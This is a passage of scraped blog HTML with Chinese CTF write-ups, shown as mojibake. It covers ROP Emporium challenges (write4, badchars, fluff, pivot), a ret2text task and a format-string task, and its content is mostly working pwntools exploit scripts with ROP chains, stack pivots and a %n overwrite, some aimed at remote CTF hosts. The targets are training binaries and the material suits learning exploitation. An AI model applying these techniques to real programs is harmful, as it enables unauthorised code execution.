#æœ¬åœ°ç¯å¢ƒé—®é¢˜éœ€åŠ ä¸Šret_addr
# ret_addr=0x4006be
# payload += p64(ret_addr) //æ›´æ¢ç¯å¢ƒåä¸éœ€è¦åŠ ä¸Šret_addräº†
io.recvuntil(b&#39;&amp;gt;&#39;)
io.sendline(payload)
# gdb.attach(io)
# pause()
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;write4&lt;/strong&gt;&lt;br&gt;
æ­¤é¢˜ä¿æŠ¤æªæ–½åŒä¸Šï¼Œåœ¨idaé‡Œé¢å‘ç°æ²¡æœ‰å¸¸è§çš„&lt;code&gt;system()&lt;/code&gt;å’Œ&lt;code&gt;/bin/sh&lt;/code&gt;ï¼Œä½†æ˜¯å´æœ‰ä¸€ä¸ª&lt;code&gt;printf_file&lt;/code&gt;å‡½æ•°ï¼Œæœ¬é¢˜æä¾›çš„libc.soæ–‡ä»¶ä¸­å«æœ‰systemå‡½æ•°ï¼Œä½†éœ€è¦è‡ªè¡Œæ„å»ºå‚æ•°ï¼ŒvmmapæŸ¥çœ‹å¯å†™æ®µ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673291428782.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åœ¨idaä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ°.bssæ®µï¼Œå¯¹åº”vmmapä¸­åœ°å€å¯çŸ¥æ­¤å¤„å¯å†™&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673291508659.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
é‚£ä¹ˆå‘è¯¥æ®µå†™å…¥éœ€è¦gadgets,ROPgadgetæ‰¾ä¸€ä¸‹&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;# Gadgets information
# ============================================================
# 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
# 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
# 0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400690 : pop r14 ; pop r15 ; ret
# 0x0000000000400692 : pop r15 ; ret
# 0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400588 : pop rbp ; ret
# 0x0000000000400693 : pop rdi ; ret
# 0x0000000000400691 : pop rsi ; pop r15 ; ret
# 0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004e6 : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‘ç°å¯ç”¨çš„ï¼Œr14å­˜bssæ®µåœ°å€ï¼Œr15å­˜&amp;quot;flag.txt&amp;quot;å­—ç¬¦ä¸²ï¼Œæ¥ç€å°†r15å†…å®¹å†™å…¥r14æŒ‡å‘çš„åœ°å€&lt;br&gt;
&lt;code&gt;pop r14 ; pop r15 ; ret&lt;/code&gt;&lt;br&gt;
&lt;code&gt;mov qword ptr [r14], r15 ; ret&lt;/code&gt;&lt;br&gt;
æ¥ç€æŒ‰&lt;strong&gt;é¡ºåº&lt;/strong&gt;ç»„è£…gadgets&lt;br&gt;
å…¶ä¸­è¯¦ç»†è°ƒç”¨å¦‚å›¾&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673347270739.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬ä¸€ä¸ªretå°†pop_r14_r15ï¼Œæ­¤æ—¶æ ˆé¡¶æ›´æ–°ä½bssæ®µåœ°å€&lt;br&gt;
åˆ™ç¼–å†™expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context.log_level=&#39;debug&#39;
context.os=&#39;linux&#39;
context.arch=&#39;amd64&#39;
context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

elf=ELF(&amp;quot;./write4&amp;quot;)
io=process(&amp;quot;./write4&amp;quot;)

func_addr=elf.symbols[b&amp;quot;print_file&amp;quot;]
bss_addr=0x601038
ret_addr=0x4004e6
pop_rdi_addr=0x400693
mov_r14_r15_addr=0x400628
pop_r14_r15_addr=0x400690
payload=cyclic(0x28)+p64(pop_r14_r15_addr)+p64(bss_addr)+b&amp;quot;flag.txt&amp;quot;+p64(mov_r14_r15_addr)

payload+=p64(pop_rdi_addr)+p64(bss_addr)+p64(func_addr)
io.recv()
gdb.attach(io)
pause()
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;badchars&lt;/strong&gt;&lt;br&gt;
æ­¤é¢˜ç»™å‡ºprint_fileå‡½æ•°å¯ä»¥æ‰“å°å‡ºæ–‡ä»¶å†…å®¹ï¼Œåˆ™åªéœ€ä¼ å…¥flag.txtå³å¯ï¼Œè€Œæˆ‘ä»¬åˆ™éœ€è¦åƒä¸Šä¸€é¢˜ä¸€æ ·å°†flag.txtå†™å…¥bssæ®µ&lt;br&gt;
æ­¤é¢˜ç»™å‡ºlibc.soï¼Œå…¶ä¸­åŒ…å«çš„pwnmeå‡½æ•°ä¸­å­˜åœ¨å‡½æ•°èƒ½æ›¿æ¢å­—ç¬¦&lt;code&gt;&#39;x&#39;,&#39;g&#39;,&#39;a&#39;,&#39;.&#39;&lt;/code&gt;,&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675184254951.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¸ºäº†ç»•è¿‡badcharsï¼Œæˆ‘ä»¬è€ƒè™‘ä½¿ç”¨å¼‚æˆ–åä¸å«å…³é”®å­—çš„å­—ç¬¦ä¸²è¾“å…¥ï¼Œå½“ä½œå‚æ•°å…ˆå†™å…¥bssæ®µï¼Œå†å¼‚æˆ–ä¸€éå¾—åˆ°åŸå­—ç¬¦ä¸²&lt;br&gt;
å¯ä»¥å†™ä¸ªå°è„šæœ¬åˆ¤æ–­&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
char a[100];
int lg;
signed main()
{
    gets(a);
    lg=strlen(a);
    for(int j=1;j&amp;lt;=9;j++)
    {
        for(int i=0;i&amp;lt;lg;i++)
        {
            cout&amp;lt;&amp;lt;char(int(a[i])^j);
        }
        cout&amp;lt;&amp;lt;endl;
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—å‡ºå¯ç”¨å­—ç¬¦ä¸²&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675184590104.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æˆ‘ä»¬é€‰æ‹©å¼‚æˆ–9ä¹‹åçš„å­—ç¬¦ä¸²&lt;code&gt;&#39;oehn&#39;}q}&#39;&lt;/code&gt;&lt;br&gt;
æ•…expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./badchars&amp;quot;)
st=b&amp;quot;oehn&#39;}q}&amp;quot; #flag.txt ^9
bss_addr=0x601038
mov_r13_r12=0x400634
pop_r12_r13_jk_jk=0x40069c
pop_r14_r15=0x4006a0
xor_r15_r14=0x400628
pop_rdi=0x4006a3
func_addr=0x400510
#edit
gdb.attach(io)
pause()
payload=cyclic(0x28)+p64(pop_r12_r13_jk_jk)+st+p64(bss_addr)+p64(0)+p64(0)+p64(mov_r13_r12) #jk junk
#decode
for i in range(0,len(st)):
    payload+=p64(pop_r14_r15)
    payload+=p64(9)
    payload+=p64(bss_addr+i)
    payload+=p64(xor_r15_r14)
payload+=p64(pop_rdi)+p64(bss_addr)+p64(func_addr)
io.recvuntil(b&amp;quot;&amp;gt;&amp;quot;)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
# 0x0000000000400635 : mov dword ptr [rbp], esp ; ret
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006a0 : pop r14 ; pop r15 ; ret
# 0x00000000004006a2 : pop r15 ; ret
# 0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400588 : pop rbp ; ret
# 0x00000000004006a3 : pop rdi ; ret
# 0x00000000004006a1 : pop rsi ; pop r15 ; ret
# 0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004ee : ret
# 0x0000000000400293 : ret 0xb2ec
# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
# 0x0000000000400629 : xor byte ptr [rdi], dh ; ret

# Unique gadgets found: 18
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥æ‰“é€š&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;fluff&lt;/strong&gt;&lt;br&gt;
æ­¤é¢˜64ä½ï¼Œä¸æ­¤å‰é¢˜ç±»ä¼¼ï¼Œä¸è¿‡æ­¤é¢˜gadgetså‡‘ä¸å‡ºä»»æ„åœ°å€å†™&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675354574785.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
äºæ˜¯çœ‹æœ¬é¢˜æç¤º&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675354609219.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ‰¾åˆ°å¯¹åº”ä¸‰ä¸ªæ²¡æœ‰è§è¿‡çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œç»æŸ¥è¯¢å¯ä»¥ç†è§£å¦‚ä¸‹ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;xlat	mov al,[al+bx]  #al raxä½8ä½
bextr rbx,rcx,rdx 	å¦‚ä¸‹ï¼š
bextr output, 0xd23aacda, 0x59
Input : 11010010001110101010110011011010 = 0xd23aacda
                          |-------|
                              \
                               \
                                \
                                 v
                               |-------|
Output: 00000000000000000000000101100110 = 0x00000166


æ‰€éœ€çš„ä½å—è¿›å…¥è¾“å‡ºçš„æœ€ä½æœ‰æ•ˆä½ï¼Œè¾“å‡ºçš„å…¶ä½™ä½å˜ä¸º 0ã€‚
stosb	  mov [rdi],al
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;äºæ˜¯æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ§åˆ¶rbxï¼Œå°†rbx+alåœ°å€æ‰€æŒ‡çš„å€¼ï¼Œå³&lt;code&gt;[bx+al]&lt;/code&gt;å˜ä¸ºæˆ‘ä»¬æ‰€éœ€çš„flag.txtå­—ç¬¦ä¸²,èµ‹å€¼ç»™raxä¹‹åï¼Œå†é€šè¿‡stosbå°†raxä½8ä½alå†™å…¥åœ°å€rdiä¸­ï¼Œå³å¯å†™çš„bssæ®µï¼Œæœ€åä¼ å‚å³å¯&lt;br&gt;
ä¸è¿‡æ­¤é¢˜éœ€æ³¨æ„æº¢å‡ºretåraxå€¼ä¸º0xbï¼Œéœ€å‡å»ï¼Œæ­¤åé™¤æœ€åä¸€æ¬¡çš„æ¯ä¸€æ¬¡éƒ½éœ€å°†å‰ä¸€æ¬¡raxçš„å€¼å‡å»ï¼Œä»¥ç¡®ä¿raxèƒ½å¤Ÿè¢«æ­£ç¡®èµ‹å€¼ï¼Œå¦å¤–æ³¨æ„rcxæ¯æ¬¡æœ‰åŠ ä¸Š0x3ef2,éœ€å‡å»æ­¤å€¼&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675355316129.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯»æ‰¾æ‰€éœ€å­—ç¬¦æˆ‘ä»¬å¯ä»¥å‰å¾€IDA View-Aä¸­å°†æ•°æ®è½¬æ¢ä¸ºdataå¯»æ‰¾(æŒ‰dé”®è½¬æ¢ï¼Œå¦‚ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675355527454.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ•…ç¼–å†™expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from string import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./fluff&amp;quot;)

flag_addr=[0x4003C4,0x4003C5,0x4003D6,0X4003CF,0x4003FD,0x4003D8,0x400246,0x4003D8] #flag.txt
flag=b&amp;quot;flag.txt&amp;quot;
pop_rdi_ret=0x4006a3
xlat_addr=0x400628  #mov al,[al+rbx]   al raxä½8ä½
pop_rdx_pop_rcx_add_rcx_bextr_addr=0x40062A  #mov rbx,rcx,rdx
stosb_addr=0x400639  #mov [rdi],al
func_addr=0x400510
bss_addr=0x601038
payload=cyclic(0x28)
for i in range(0,8):
    payload+=p64(pop_rdx_pop_rcx_add_rcx_bextr_addr)
    payload+=p64(0x2000)  #0x20 8ä½16è¿›åˆ¶æ•°å 4å­—èŠ‚ï¼Œ4bytes=32bits
    if i==0:
        payload+=p64(flag_addr[i]-0x3EF2-0xb)
    else:
        payload+=p64(flag_addr[i]-0x3EF2-int(flag[i-1]))
    payload+=p64(xlat_addr)
    payload+=p64(pop_rdi_ret)
    payload+=p64(bss_addr+i)
    payload+=p64(stosb_addr)

payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(func_addr)

gdb.attach(io)
pause()

io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;pivot&lt;/strong&gt;&lt;br&gt;
æ­¤é¢˜64ä½å¼€å¯nxä¿æŠ¤&lt;br&gt;
idaåç¼–è¯‘è¿‡åå‘ç°å‘ç”Ÿæº¢å‡ºçš„ä¸ºç¬¬äºŒæ¬¡è¾“å…¥ï¼Œä½†æ˜¯æº¢å‡ºåå¯ç”¨é•¿åº¦ä»…ä¸º0x18ï¼ˆ0x40-0x28&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539374390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ ¹æ®æœ¬é¢˜æç¤ºéœ€è¦è¿›è¡Œæ ˆè¿ç§»&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675540644083.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œä¸€å¼€å§‹ç¨‹åºå°±è¾“å‡ºäº†è¿ç§»çš„åœ°å€&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539582981.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è€Œusefulgadgetsé‡Œé¢æä¾›çš„xhcgæŒ‡ä»¤&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539618638.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¯¥æŒ‡ä»¤å¯ä»¥äº¤æ¢å¯„å­˜å™¨çš„å€¼ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å…ˆå°†æç¤ºè¦è¿ç§»çš„åœ°å€å†™å…¥raxï¼Œç„¶åå†äº¤æ¢raxå’Œrspçš„å€¼ï¼Œä¹‹åretæ—¶ç›¸å½“äºpop ripï¼Œæ ¹æ®é¢˜ç›®çŒœæµ‹æ­¤æ—¶è¿›è¡Œæ ˆè¿ç§»&lt;br&gt;
æ ˆè¿ç§»åæœ‰å¦‚æ­¤é•¿åº¦æˆ‘ä»¬ä¾¿å¯ä»¥ä¸å—é•¿åº¦é™åˆ¶åœ°ç¼–å†™payloadäº†&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675540154636.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ­¤é¢˜ç»™å‡ºlibpivot.soæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸»ç¨‹åºä¸­åç¼–è¯‘æ²¡æœ‰ret2winå‡½æ•°ï¼Œè¦å…ˆä»ç¨‹åºä¸­è°ƒç”¨&lt;code&gt;foothold_function&lt;/code&gt;ä¹‹åï¼Œæ³„éœ²å‡½æ•°åœ¨å†…å­˜ä¸­çœŸå®åœ°å€ï¼Œç„¶åå†é€šè¿‡&lt;code&gt;.soæ–‡ä»¶&lt;/code&gt;ä¸­ä¸¤å‡½æ•°ä¹‹é—´çš„åç§»é‡è®¡ç®—ï¼Œè¿›è€Œè°ƒç”¨&lt;code&gt;ret2win&lt;/code&gt;å‡½æ•°ï¼Œå‰©ä¸‹çš„gadgetsç»„è£…å°±æ˜¯å…¸å‹çš„ret2libcç±»å‹ï¼Œä¸è¿‡æä¾›çš„gadgetsè®©payloadç®€åŒ–äº†è®¸å¤š&lt;br&gt;
expå¦‚ä¸‹ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

io=process(&amp;quot;./pivot&amp;quot;)
elf=ELF(&amp;quot;./pivot&amp;quot;)

func_plt=elf.plt[b&amp;quot;foothold_function&amp;quot;]
func_got=elf.got[b&amp;quot;foothold_function&amp;quot;]
mov_rax_prax=0x4009c0
pop_rax_ret=0x4009bb
pop_rbp_ret=0x4007c8
add_rax_rbp=0x4009C4
xhcg_rax_rsp=0x4009BD
call_rax=0x4006b0
offset=0x117  #offset

io.recvuntil(b&amp;quot;pivot: &amp;quot;)
heap_addr=int(io.recv(14),16) 

print(&amp;quot;addr &amp;quot;+hex(heap_addr))

payload2=cyclic(0x28)+p64(pop_rax_ret)+p64(heap_addr)+p64(xhcg_rax_rsp)


payload1=p64(func_plt)+p64(pop_rax_ret)+p64(func_got)+p64(mov_rax_prax)+p64(pop_rbp_ret)+p64(offset)+p64(add_rax_rbp)+p64(call_rax)

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(payload1)

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(payload2)

io.interactive()




# 0x00000000004009BB 58                            pop     rax
# 0x00000000004009BC C3                            retn
# 0x00000000004009BC
# 0x00000000004009BD 48 94                         xchg    rax, rsp
# 0x00000000004009BF C3                            retn
# 0x00000000004009BF
# 0x00000000004009C0 48 8B 00                      mov     rax, [rax]
# 0x00000000004009C3 C3                            retn
# 0x00000000004009C3
# 0x00000000004009C4 48 01 E8                      add     rax, rbp
# 0x00000000004009C7 C3                            retn
# 0x00000000004006b0 : call rax
# 0x0000000000400822 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
# 0x00000000004009c1 : mov eax, dword ptr [rax] ; ret
# 0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
# 0x0000000000400a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a2e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a30 : pop r14 ; pop r15 ; ret
# 0x0000000000400a32 : pop r15 ; ret
# 0x00000000004009bb : pop rax ; ret
# 0x0000000000400a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a2f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007c8 : pop rbp ; ret
# 0x0000000000400a33 : pop rdi ; ret
# 0x0000000000400a31 : pop rsi ; pop r15 ; ret
# 0x0000000000400a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b6 : ret
&lt;/code&gt;&lt;/pre&gt;
">ROP Emporium writeup</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/aRuqWGDeR/"" data-c="
          &lt;p&gt;æ­¤é¢˜ä¸º64ä½ret2texté¢˜ç›®&lt;br&gt;
å…ˆæŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674547561780.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æä¾›systemå‡½æ•°ï¼Œä½†æ˜¯stringé‡Œé¢æ²¡æœ‰æä¾›/bin/sh&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674547623074.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
tipsæé†’ï¼Œæ­¤é¢˜è€ƒè™‘ä¼ å…¥&lt;code&gt;$0&lt;/code&gt;ä»è€Œæ„å»º&lt;code&gt;system($0)&lt;/code&gt;&lt;br&gt;
æ•…expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io=process(&amp;quot;./shell&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28279)
elf=ELF(&amp;quot;./shell&amp;quot;)

ret_addr=0x400416
sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
pop_rdi_addr=0x4005e3
str_0_addr=0x400541
payload=cyclic(0x18)+p64(ret_addr)+p64(pop_rdi_addr)+p64(str_0_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[GFCTF 2021]where_is_shell wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/T0lmUGTzu/"" data-c="
          &lt;p&gt;æ­¤é¢˜32ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²&lt;br&gt;
idaå¯ä»¥çœ‹å‡ºé™åˆ¶è¾“å…¥é•¿åº¦ï¼Œæ²¡æ³•æ­£å¸¸æº¢å‡º&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674214573867.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç”±ä¼ªä»£ç å¯çŸ¥åˆ¤æ–­ç¬¬äºŒæ¬¡è¾“å…¥å’Œ0x804C044å¤„å€¼ç›¸ç­‰å³å¯è¾“å‡ºflag.txtï¼Œä½†æ­¤å¤„å€¼ä¸ºéšæœº&lt;br&gt;
ä½†æ˜¯å­˜åœ¨&lt;code&gt;printf(buf)&lt;/code&gt;æ„å‘³ç€å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œäºæ˜¯å¯ä»¥ä¿®æ”¹0x804C044å¤„çš„å€¼æ¥è¾¾åˆ°ç›®çš„&lt;br&gt;
32ä½å­˜æ”¾å‚æ•°åœ¨æ ˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶è®¡ç®—å‡ºprintfçš„offset&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674214980741.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç”±å›¾å¯çŸ¥offsetä¸º10ï¼ŒAçš„ASCIIä¸º41ï¼Œ41414141å‡ºç°åœ¨ç¬¬åä¸ª%xå¤„&lt;br&gt;
æ ¹æ®è¦†ç›–å†…å­˜åœ°å€æ ¼å¼&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674215087906.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥ç¼–å†™expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
# io=process(&amp;quot;./[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26596)
bc_addr=0x804C044 #è¦†å†™åœ°å€
payload=p32(bc_addr)+b&amp;quot;%10$n&amp;quot; #offsetæµ‹ç®—ä¸º10
io.sendline(payload)
io.sendline(b&amp;quot;4&amp;quot;) #0x804C044 8ä½16è¿›åˆ¶æ•°å ç”¨4bytes
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 1 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/p8Ia9mzuv/"" data-c="
          &lt;ul&gt;
&lt;li&gt;æ±‡ç¼–&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;func_1:
    mov ax, CCCC
    mov cx, 128
MyLoop: 
    mov [bx], ax
    add bx, 2
    loop MyLoop
    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;func_1çš„ä½œç”¨æ˜¯&lt;br&gt;
å°†CCCCé€è¿›axå¯„å­˜å™¨ï¼Œå°†128é€è¿›cxå¯„å­˜å™¨&lt;/p&gt;
&lt;p&gt;MyLoopçš„ä½œç”¨æ˜¯&lt;br&gt;
å°†axå¯„å­˜å™¨çš„å€¼&lt;code&gt;CCCC&lt;/code&gt;é€è¿›åç§»åœ°å€ä¸ºbxä¸­çš„å€¼çš„å†…å­˜å•å…ƒ&lt;br&gt;
ç„¶åå°†bxçš„å€¼åŠ 2ï¼ˆç»“æœå¯èƒ½æ˜¯è¿›å…¥ä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒçš„åœ°å€,ä¹Ÿå°±æ˜¯ä¸‹ä¸€ä¸ªå…ƒç´ åœ°å€&lt;br&gt;
ç„¶ååœ¨å›åˆ°MyLoopå°†cxå‡ä¸€ï¼Œå¦‚æœcxä¸ä¸º0åˆ™ç»§ç»­é‡å¤æ‰§è¡Œä»¥ä¸Šæ“ä½œ&lt;br&gt;
æ”¹å†™ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;func_1:
    mov ax, CCCC
    mov cx, 128
MyLoop:
    mov [bx], ax
    add bx, 2
    sub cxï¼Œ1
    cmp cxï¼Œ0
    jnz MyLoop
    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ ¹æ®&lt;code&gt;xor     eax, 33h&lt;/code&gt;çŒœæµ‹åŠ å¯†æ–¹å¼ä¸ºå¼‚æˆ–&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
a=[0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]
for i in range(len(a)):
    print(chr(a[i]^0x33),end=&#39;&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1673969471280.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def calc(num):
    if num&amp;lt;1:
        return 1
    else:
        return num*calc(num-1)
tp=int(input())
print(calc(tp))
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

def pd(a):
    for i in range(len(a)):
        if int(a[i],2)%5==0:
            print(a[i]+&amp;quot; &amp;quot;,end=&#39;&#39;)
        else:
            continue

a=input().split(&amp;quot;,&amp;quot;)
pd(a)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ELFè§£æå™¨ï¼š&lt;/p&gt;
